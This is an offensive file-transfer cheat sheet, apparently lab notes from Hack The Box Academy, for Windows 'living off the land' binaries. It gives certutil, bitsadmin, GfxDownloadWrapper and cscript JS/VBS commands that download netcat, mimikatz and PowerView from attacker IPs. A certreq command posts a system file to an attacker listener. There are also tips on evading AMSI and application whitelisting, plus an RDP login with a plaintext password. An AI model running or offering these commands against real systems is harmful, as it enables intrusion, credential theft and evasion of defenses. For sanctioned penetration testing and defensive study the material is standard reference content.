# Windows Native Transfers (CMD / LOLBINs)

## CertUtil

AMSI may flag this — consider base64 encoding to bypass. Useful for pulling tools through pivots.

```cmd
certutil.exe -urlcache -split -f http://10.10.10.32/nc.exe nc.exe
certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```

Base64 encode/decode with CertUtil:

```cmd
certutil.exe -encode nc.exe nc.txt
certutil.exe -urlcache -split -f "http://10.10.10.32/nc.txt" nc.txt
certutil.exe -decode nc.txt nc.exe
```

---

## Bitsadmin

```cmd
bitsadmin /transfer wcb /priority foreground http://10.10.10.32:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

---

## CertReq.exe Upload (LOLBIN)

```cmd
certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```

Catch on attacker with `nc -lvnp 8000`.

---

## GfxDownloadWrapper.exe (LOLBIN)

Intel Graphics Driver binary — may bypass application whitelisting:

```powershell
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

---

## RDP File Transfer

### Mount Local Folder via xfreerdp / rdesktop

```bash
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

Access the mounted drive on the remote machine at `\\tsclient\linux`. Not accessible to other users on the target.

---

## JavaScript Download (cscript.exe)

Save as `wget.js`:

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

```cmd
cscript.exe /nologo wget.js http://10.10.10.32/PowerView.ps1 PowerView.ps1
```

---

## VBScript Download (cscript.exe)

Save as `wget.vbs`:

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

```cmd
cscript.exe /nologo wget.vbs http://10.10.10.32/PowerView.ps1 PowerView.ps1
```

---

## References

- [LOLBAS Project (Windows)](https://lolbas-project.github.io) — search `/download` or `/upload`
- [GTFOBins (Linux)](https://gtfobins.github.io/) — search `+file download` or `+file upload`
